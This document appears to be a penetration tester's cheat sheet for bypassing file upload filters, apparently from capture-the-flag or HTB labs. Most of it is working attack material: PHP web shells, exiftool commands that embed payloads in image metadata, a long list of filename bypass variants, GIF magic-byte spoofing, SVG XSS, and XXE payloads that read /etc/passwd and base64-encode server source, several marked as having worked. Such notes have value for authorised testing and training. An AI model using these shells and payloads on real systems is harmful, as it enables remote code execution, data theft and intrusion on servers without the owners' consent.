
- Change mime type
- Add image headers
- Add payload in exiftool comment and name file as file.php.png
- ExifTool 
    - 1. <?php system($_GET['cmd']); ?> //shell.php 
    - 2. exiftool "-comment<=shell.php" malicious.png 
    - 3. strings malicious.png | grep system

##### <span style="color:#FFB86C">Paylaods</span>
https://github.com/KathanP19/HowToHunt/blob/master/File_Upload/file_upload.md

# <span style="color:#FF5555">Extension bypass tricks</span>
- **Null byte** — append a null byte before an allowed extension so the server truncates at it: `shell.php%00.png` (works on old PHP < 5.3.4 / certain configs).
- **Zip slip** — upload a crafted zip whose entries use `../` path traversal so extraction writes files outside the intended folder (overwrite a web-root file / drop a shell).

# <span style="color:#FF5555">Blacklist Filters</span>
- paylaods
```bash
.phtml
.php5
.phps
.pht
.phtm
.phar // worked
```
- shell
```php
<?php system($_REQUEST["cmd"]); ?>
```

# <span style="color:#FF5555">Whitelist Filters</span>

- `shell.phar;.jpg` (worked)
- `shell.jpg.php` ✅ (may pass weak whitelist regex)
- `shell.php.jpg` ✅ (bypasses strict whitelist but executes if server uses weak `FilesMatch`)
- `shell.php%00.jpg` ✅ (bypasses old PHP 5.x or vulnerable setups)
- `shell.phtml` ✅ (works if `.phtml` is not blacklisted)
- `shell.phar` ✅ (supported by some Apache configs)
#### <span style="color:#FFB86C">Character Injection</span>
- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

```bash
shell%20.php.jpg
shell.php%20.jpg
shell.jpg%20.php
shell.jpg.php%20
shell%20.phps.jpg
shell.phps%20.jpg
shell.jpg%20.phps
shell.jpg.phps%20
shell%0a.php.jpg
shell.php%0a.jpg
shell.jpg%0a.php
shell.jpg.php%0a
shell%0a.phps.jpg
shell.phps%0a.jpg
shell.jpg%0a.phps
shell.jpg.phps%0a
shell%00.php.jpg
shell.php%00.jpg
shell.jpg%00.php
shell.jpg.php%00
shell%00.phps.jpg
shell.phps%00.jpg
shell.jpg%00.phps
shell.jpg.phps%00
shell%0d0a.php.jpg
shell.php%0d0a.jpg
shell.jpg%0d0a.php
shell.jpg.php%0d0a
shell%0d0a.phps.jpg
shell.phps%0d0a.jpg
shell.jpg%0d0a.phps
shell.jpg.phps%0d0a
shell/.php.jpg
shell.php/.jpg
shell.jpg/.php
shell.jpg.php/
shell/.phps.jpg
shell.phps/.jpg
shell.jpg/.phps
shell.jpg.phps/
shell.\\.php.jpg
shell.php.\\.jpg
shell.jpg.\\.php
shell.jpg.php.\\
shell.\\.phps.jpg
shell.phps.\\.jpg
shell.jpg.\\.phps
shell.jpg.phps.\\
shell..php.jpg
shell.php..jpg
shell.jpg..php
shell.jpg.php.
shell..phps.jpg
shell.phps..jpg
shell.jpg..phps
shell.jpg.phps.
shell….php.jpg
shell.php….jpg
shell.jpg….php
shell.jpg.php…
shell….phps.jpg
shell.phps….jpg
shell.jpg….phps
shell.jpg.phps…
shell:.php.jpg
shell.php:.jpg
shell.jpg:.php
shell.jpg.php:
shell:.phps.jpg
shell.phps:.jpg
shell.jpg:.phps
shell.jpg.phps:
```


# <span style="color:#FF5555">Type Filters</span>

**Server uses `mime_content_type()`** or similar, so we must **fake magic bytes** (e.g. start the file with `GIF89a` or `GIF8`).

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

```php
GIF8
<?php system($_GET['cmd']); ?>
```

- `shell.gif.phar` (worked)
- `shell.php.gif`

# <span style="color:#FF5555">Limited File Uploads (svg)</span>

## <span style="color:#8BE9FD">XSS (Cross Site Scripting)</span>

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
### <span style="color:#50FA7B">XXE ( XML external entity (XXE) injection)</span>


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

(worked)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

base64 (worked)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/upload.php">
]>
<svg>&xxe;</svg>
```

worked with `Untitled./phar;.svg`

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
<?php system($_GET['cmd']); ?>
```
